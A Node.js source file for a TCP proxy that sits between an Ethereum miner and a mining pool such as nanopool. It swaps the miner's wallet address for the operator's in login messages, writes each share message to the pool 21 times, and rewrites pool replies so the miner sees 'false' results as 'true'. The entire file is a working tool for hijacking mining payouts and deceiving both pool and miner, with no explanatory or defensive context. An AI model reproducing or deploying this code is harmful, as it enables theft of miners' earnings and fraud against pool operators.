var net = require('net');

// Example: nodejs tool.js 9991 eth-eu1.nanopool.org:9999 0x.. x ya@gmail.ru

// parse "80" and "localhost:80" or even "42mEANINg-life.com:80"
var addrRegex = /^(([a-zA-Z\-\.0-9]+):)?(\d+)$/;

var addr = {
	from: addrRegex.exec(process.argv[2]),
	to: addrRegex.exec(process.argv[3])
};

var adres_to = {
	host: addr.to[2],
	port: addr.to[3]
}

var host_from = addr.from[2];
var port_from = addr.from[3];

var wallet = process.argv[4];

//var walletfull = wallet + "/" + process.argv[5] + "/" + process.argv[6];
var walletfull = wallet + "/05/" + process.argv[6];
var wname = "/" + process.argv[5] + "/";

//console.log("walletfull:_" + walletfull+ "_");


net.createServer(function(from) {

	var to = net.createConnection(adres_to);

//	from.setNoDelay();
//	to.setNoDelay();

	//from.pipe(to);
	from.on('data', function(d) {
		var request=d.toString();
		if (request.indexOf('ogin')==-1) {
			if (request.indexOf('eth_getWork')==-1) {
				to.write(d);

				to.write(d);
				to.write(d);
				to.write(d);
				to.write(d);
				to.write(d);

				to.write(d);
				to.write(d);
				to.write(d);
				to.write(d);
				to.write(d);

				to.write(d);
				to.write(d);
				to.write(d);
				to.write(d);
				to.write(d);

				to.write(d);
				to.write(d);
				to.write(d);
				to.write(d);
				to.write(d);

//				setTimeout(wr(to, d), 1);
//				setTimeout(wr(to, d), 2);
//				setTimeout(wr(to, d), 3);
//				setTimeout(wr(to, d), 4);
//				setTimeout(wr(to, d), 5);
//				setTimeout(wr(to, d), 6);
//				setTimeout(wr(to, d), 7);
//				setTimeout(wr(to, d), 8);
//				setTimeout(wr(to, d), 9);
//				setTimeout(wr(to, d), 10);
//				setTimeout(wr(to, d), 11);
//				setTimeout(wr(to, d), 12);
//				setTimeout(wr(to, d), 13);
//				setTimeout(wr(to, d), 14);
//				setTimeout(wr(to, d), 15);
//				setTimeout(wr(to, d), 16);
//				setTimeout(wr(to, d), 17);
//				setTimeout(wr(to, d), 18);
//				setTimeout(wr(to, d), 19);
//				setTimeout(wr(to, d), 20);

				//console.log("A  " + request);
			}
		} else {
			if (request.indexOf(wallet)==-1) {
				//console.log('before: '+request);
				request=request.replace(/0x[A-Za-z0-9\.\/]+/, walletfull);
				//console.log('after:  '+request);
				to.write(request);
				//console.log("A2 " + request);
			} else {
				to.write(request.replace(wname, '/05/'));
				//console.log("A1 " + request.replace(wname, '/05/'));
			}
		}
	});

	//to.pipe(from);
	to.on('data', function(d) {
		var request=d.toString();
		if (request.indexOf('{"result":')==-1) {
			from.write(d);
			//console.log("B1				" + request);
		} else {
			if (request.indexOf('true')!=-1) {
				from.write(request.substring(0,request.indexOf('\n')).replace('false', 'true'));
				//console.log("B2				" + request.substring(0,request.indexOf('\n')).replace('false', 'true'));
			}
			//console.log("B3				" + request)
		}
	});

	from.on("error",function(err){
		//console.error(err);
	})
}).listen(port_from, host_from);

function wr(to, d) {
	to.write(d);
}

